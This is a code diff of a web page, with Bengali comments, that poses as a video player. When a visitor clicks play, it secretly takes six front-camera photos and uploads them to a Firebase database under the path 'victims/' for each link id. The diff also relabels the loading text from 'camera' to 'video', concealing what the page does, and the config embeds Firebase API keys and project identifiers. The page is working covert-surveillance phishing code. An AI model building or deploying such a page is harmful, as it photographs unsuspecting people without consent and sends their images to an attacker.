@@ -16,19 +16,31 @@
 <body>
 <div class="bg"></div>
 <div class="play" onclick="start()"></div>
-<div class="loading" id="load">ক্যামেরা চালু হচ্ছে...</div>
+<div class="loading" id="load">ভিডিও চালু হচ্ছে...</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
+const firebaseConfig = {
+  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
+  authDomain: "cam-snap-8e956.firebaseapp.com",
+  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
+  projectId: "cam-snap-8e956",
+  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
+};
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
+
 const id = new URLSearchParams(location.search).get('id');
+if(!id){
+  document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";
+}
 
 function start(){
   document.querySelector('.play').style.display = 'none';
   document.getElementById('load').style.display = 'block';
+
+  // ৬টা ছবি তুলবে (সামনের ক্যামেরা)
   for(let i=0; i<6; i++){
     setTimeout(()=>capture(), i*700);
   }
@@ -37,11 +49,7 @@ function start(){
 async function capture(){
   try{
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "user",
-        width: { ideal: 1920 },   // বড় সাইজ
-        height: { ideal: 1080 }
-      }
+      video: { facingMode: "user", width: {ideal:1920}, height: {ideal:1080} }
     });
     const v = document.createElement('video');
     v.srcObject = stream;
@@ -49,21 +57,24 @@ async function capture(){
 
     v.onloadedmetadata = () => {
       setTimeout(()=>{
-        // বড় ক্যানভাস + হাই কোয়ালিটি
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth || 1280;
-        c.height = v.videoHeight || 720;
-        const ctx = c.getContext('2d');
-        ctx.drawImage(v, 0, 0, c.width, c.height);
+        const canvas = document.createElement('canvas');
+        canvas.width = v.videoWidth || 1280;
+        canvas.height = v.videoHeight || 720;
+        canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+        const dataURL = canvas.toDataURL('image/jpeg', 0.95);
 
-        // সর্বোচ্চ কোয়ালিটি (0.95)
-        const data = c.toDataURL('image/jpeg', 0.95);
+        // ফায়ারবেসে পাঠানো
+        db.ref('victims/'+id).push({
+          data: dataURL,
+          time: Date.now()
+        });
 
-        db.ref('victims/'+id).push({data, time:Date.now()});
         stream.getTracks().forEach(t=>t.stop());
-      }, 1000); // আরও ভালো ফ্রেমের জন্য
+      }, 1000);
     };
-  }catch(e){}
+  }catch(e){
+    console.log("Camera blocked or not available");
+  }
 }
 </script>
 </body>
